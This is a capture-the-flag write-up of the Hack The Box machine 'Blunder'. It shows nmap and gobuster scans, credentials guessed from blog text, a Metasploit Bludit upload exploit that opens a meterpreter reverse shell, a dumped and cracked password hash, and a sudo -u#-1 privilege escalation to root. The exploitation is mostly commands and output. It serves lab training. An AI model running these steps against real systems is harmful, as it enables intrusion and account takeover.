================================================================================
=============================     BLUNDER    ===================================
===========================      By Shad       =================================
================================================================================

This HTB box is a Linux made by egotisticalSW
We start by a nmap scan:
```
$ nmap -sC -sV -oA nmap/initial 10.10.10.191
# Nmap 7.80 scan initiated Mon Oct 12 23:29:25 2020 as: nmap -sC -sV -oA nmap/initial 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.013s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 12 23:29:37 2020 -- 1 IP address (1 host up) scanned in 12.20 seconds
```
Nmap scan shows a closed FTP 21 port and an open 80 HTTP Apache.
The website is a blog with 3 articles on Stephen King, Google Stadia and
USB.

The website runs on BluditCMS, a CMS written in PHP

Runnning gobuster with .php,.txt extensions:
```
shad@kali:~/htb/blunder$ gobuster dir -u http://10.10.10.191 -w ./directory-list-2.3-small.txt -x .php,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        10
[+] Wordlist:       ./directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/10/13 13:17:59 Starting gobuster
===============================================================
/about (Status: 200)
/0 (Status: 200)
/admin (Status: 301)
/install.php (Status: 200)
/robots.txt (Status: 200)
/todo.txt (Status: 200)
/usb (Status: 200)
/LICENSE (Status: 200)
```

todo.txt:
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

We add fergus as potential user in users.txt
While reading the articles on the website, we find this odd part in the Stephen
King Article:
```
[...] He has created probably the best fictional character RolandDeschain in The Dark tower series
``` 
`RolandDeschain` might be a password. We add it to our passfile passwords.txt

Using these creds, we try to log in the Bludit /admin endpoint:
We got logged in the CMS backend application.
Note: we also could have leveraged CVE-2019-17240 "Authentication Bruteforce
Mitigation Bypass" and wrote a bruteforce script for that login page, using ̀ cewl`
to build a wordlist of the articles on the page.

Using metasploit and CVE 2019-16113  we'll open a shell on the box:
```
msf5> use exploit/linux/http/bludit_upload_images_exec
msf5> options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2

msf5> set BLUDITUSER fergus
msf5> set BLUDITPASS RolandDeschain
msf5> set RHOSTS 10.10.10.191
msf5> set LHOST tun0
msf5> set PAYLOAD php/meterpreter/reverse_tcp
msf5> exploit
[*] Started reverse TCP handler on 10.10.14.211:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading mAhpVCjxta.png...
[*] Uploading .htaccess...
[*] Executing mAhpVCjxta.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.211:4444 -> 10.10.10.191:33488) at 2020-10-13 13:37:16 +0200
[+] Deleted .htaccess

meterpreter > shell
/bin/whoami
www-data
```

We then upload linpeas.sh to the box, run it, then exfil the results to study
the report:

```
meterpreter> upload ./linpeas.sh linpeas.sh
meterpreter> shell
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blunder:/var/bludit-3.9.2/bl-content/tmp$ ./linpeas.sh -a > out.txt
```
Linpeas didn't show much.
Reading more on passwords policies of Bludit, we find that passwords are hashed
and stored in /bl-content/databases/users.php.

We also found an alternative installation of Bludit, version 3.10.0a

```
www-data@blunder:/var/www$ find . -name "users.php"
./bludit-3.10.0a/bl-kernel/admin/controllers/users.php
./bludit-3.10.0a/bl-kernel/admin/views/users.php
./bludit-3.10.0a/bl-content/databases/users.php
./bludit-3.9.2/bl-kernel/admin/controllers/users.php
./bludit-3.9.2/bl-kernel/admin/views/users.php
./bludit-3.9.2/bl-content/databases/users.php
www-data@blunder:/var/www$ cat ./bludit-3.10.0a/bl-content/databases/users.php
cat ./bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Using hashes.org, we search for the hash: we find the password "Password120"
and are able to log in as Hugo in the box:

```
www-data@blunder:/var/www$ su hugo
su hugo
Password: Password120

hugo@blunder:/var/www$ cat /home/hugo/user.txt | wc -c
33
```
We owned user. Moving on to priv-escalation:

```
$ hugo@blunder:/home/$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
temp:x:1002:1002:,,,:/home/temp:/bin/bash

hugo@blunder:/home/$ sudo -l
Password: Password120
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

This means Hugo may run /bin/bash as different users except root:
```
hugo@blunder:/home/$ sudo -u temp /bin/bash
temp@blunder:/home/$ 
```
The (ALL, !root) rule allows us to leverage CVE-2019-14287 vuln, "Allow Bypass
of User Restrictions":

```
hugo@blunder:/home$ sudo -u#-1 bash
Password: Password120
root@blunder:/home$ cat /root/root.txt | wc -c
33
```

We owned the root account.

